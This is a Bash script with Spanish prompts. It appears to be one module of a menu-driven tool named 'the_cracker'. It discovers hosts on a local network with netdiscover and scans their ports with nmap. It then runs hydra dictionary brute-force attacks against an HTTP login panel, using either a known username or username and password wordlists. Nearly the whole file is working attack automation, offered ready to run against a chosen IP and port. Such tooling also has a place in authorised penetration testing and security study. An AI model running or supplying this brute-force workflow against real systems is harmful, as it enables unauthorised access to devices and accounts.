#!/bin/bash

source requisitos/0.sh

Title
echo " [4] Desencriptar el Login de una IP Local (192.168.1.1:80)"
echo
echo " =================================================="
echo " 1º Escaneo (Ip + Puertos) + Ataque (Diccionario)"" |"
echo " --------------------------------------------------"
echo " 2º Ataque de Diccionario a Ip+Puerto""             |"
echo " --------------------------------------------------"
echo " 3º Volver al Menu""                                |"
echo " =================================================="
echo
echo
read -p " [*] Elige una opcion: " opc1
	case $opc1 in
			1 ) echo
                read -p " [*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " IpRed
                sudo gnome-terminal --geometry 80x38+1300+20 -- sudo netdiscover -r $IpRed/24
                read -p " [*] Escribe la Ip del Objetivo (Ej: 192.168.1.43): " Ip
                sudo pkill gnome-terminal
                sudo gnome-terminal --geometry 80x24+1300+20 -- bash -c "sudo nmap -top-ports 1000 -Pn $Ip; sleep 999;"
                read -p " [*] Escribe el puerto Objetivo (Ej: 80): " puerto
                sudo pkill gnome-terminal
                echo
                echo " =============================================="
                echo " 1º Si sabes el Usuario pero no la Contraseña"" |"
                echo " ----------------------------------------------"
                echo " 2º No sabes el Usuario ni la Contraseña""      |"
                echo " =============================================="
                echo
                read -p " [*] Elige una opcion: " opc2
                Title
                echo " [#] Ultimos ajustes para Atacar al Objetivo $Ip:$puerto"
                echo
                    case $opc2 in
                            1 )	echo
                                read -p " [*] Escribe el usuario (Ej: admin): " usr
                                read -p " [*] Pon la ruta del Diccionario (Ej: /home/root/dicc1.txt): " dicc1
                                read -p " [*] Pon la ruta del Panel Login, en caso de no tener pon una / (Ej: /login.php): " ruta
                                echo
                                primera=`echo $dicc1 | head -c 1`
								coma="'"
								if [ $primera = $coma ]
									then
										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
								fi
                                sudo hydra -s $puerto -l $usr -P $dicc1 $Ip http-get $ruta -f -V -I
                                ;;
                            2 )	echo
                                read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/root/dicc1.txt): " dicc1
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/root/dicc2.txt): " dicc2
                                read -p " [*] Pon la ruta del Panel Login, en caso de no tener pon una / (Ej: /login.php): " ruta
                                echo
                                primera=`echo $dicc1 | head -c 1`
								segunda=`echo $dicc2 | head -c 1`
								coma="'"
								if [ $primera = $coma ]
									then
										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
								fi
								if [ $segunda = $coma ]
									then
										dicc2=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
								fi
                                sudo hydra -s $puerto -L $dicc1 -P $dicc2 $Ip http-get $ruta -f -V -I
                                ;;
                            * )	echo
                                echo "$RRPLY No es una opcion valida"
                    esac
                ;;
            2 ) echo
                echo " ==================================================="
                echo " 1º Si sabes el usuario pero no la Contraseña""      |"
                echo " ---------------------------------------------------"
                echo " 2º No sabes el usuario ni la Contraseña""           |"
                echo " ==================================================="
                echo
                read -p " [*] Elige una opcion: " opc
                    case $opc in
                            1 )	read -p " [*] Escribe la ip (Ej: 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 80): " puerto
                                read -p " [*] Escribe el usuario (Ej: admin): " usr
                                read -p " [*] Pon la ruta del Diccionario (Ej: /home/kali/Wordlists/pass.txt): " dicc1
                                read -p " [*] Pon la ruta del Panel Login, en caso de no tener pon una / (Ej: /login.php): " ruta
                                echo
                                primera=`echo $dicc1 | head -c 1`
								coma="'"
								if [ $primera = $coma ]
									then
										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
								fi
                                sudo hydra -s $puerto -l $usr -P $dicc1 $Ip http-get $ruta -f -V -I
                                ;;
                            2 )	read -p " [*] Escribe la ip (Ej: 192.168.1.10): " Ip
                                read -p " [*] Escribe el puerto (Ej: 80): " puerto
                                read -p " [*] Pon la ruta del Diccionario del usuario (Ej: /home/kali/Wordlists/usr.txt): " dicc1
                                read -p " [*] Pon la ruta del Diccionario de la Contraseña (Ej: /home/kali/Wordlists/pass.txt): " dicc2
                                read -p " [*] Pon la ruta del Panel Login, en caso de no tener pon una / (Ej: /login.php): " ruta
                                echo
                                primera=`echo $dicc1 | head -c 1`
								segunda=`echo $dicc2 | head -c 1`
								coma="'"
								if [ $primera = $coma ]
									then
										dicc1=`echo $dicc1 | cut -c 2- | rev | cut -c2- | rev`
								fi
								if [ $segunda = $coma ]
									then
										dicc2=`echo $dicc2 | cut -c 2- | rev | cut -c2- | rev`
								fi
                                sudo hydra -s $puerto -L $dicc1 -P $dicc2 $Ip http-get $ruta -f -V -I
                                ;;
                            * )	echo
                                echo "$RRPLY No es una opcion valida"
                    esac
                ;;
            3 ) bash the_cracker.sh
                ;;
            * )	echo
				echo "$RRPLY No es una opcion valida"
				sleep 3
				bash requisitos/4.sh
	esac
echo
echo
echo " ==================="
echo " 1-Volver al Menu"
echo " 2-Volver a ejecutar"
echo " 3-Salir"
echo " ==================="
echo
read -p " [*] Elige una opcion: " opc3
	case $opc3 in
			1 )	bash the_cracker.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
                